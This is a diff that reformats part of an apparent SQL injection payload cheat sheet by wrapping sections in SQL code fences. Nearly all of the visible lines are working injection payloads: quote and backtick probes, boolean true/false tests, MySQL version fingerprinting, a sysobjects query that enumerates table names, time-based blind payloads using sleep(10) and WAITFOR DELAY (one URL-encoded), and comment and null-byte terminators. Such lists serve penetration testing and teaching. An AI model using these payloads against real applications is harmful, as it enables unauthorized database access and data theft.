@@ -1,3 +1,4 @@
+```sql
 '
 ''
 `
@@ -32,9 +33,10 @@
 
 @variable	local variable
 @@variable	global variable
-
+```
 
 # Numeric
+```sql
 AND 1
 AND 0
 AND true
@@ -69,20 +71,23 @@ AND false
 ' AND MID(VERSION(),1,1) = '5';
 
 ' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --
-
+```
 
 Finding the table name
 
 
 Time-Based:
+```sql
 ,(select * from (select(sleep(10)))a)
 %2c(select%20*%20from%20(select(sleep(10)))a)
 ';WAITFOR DELAY '0:0:30'--
+```
 
 Comments:
-
+```sql
 #	    Hash comment
 /*  	C-style comment
 -- -	SQL comment
 ;%00	Nullbyte
 `	    Backtick
+```
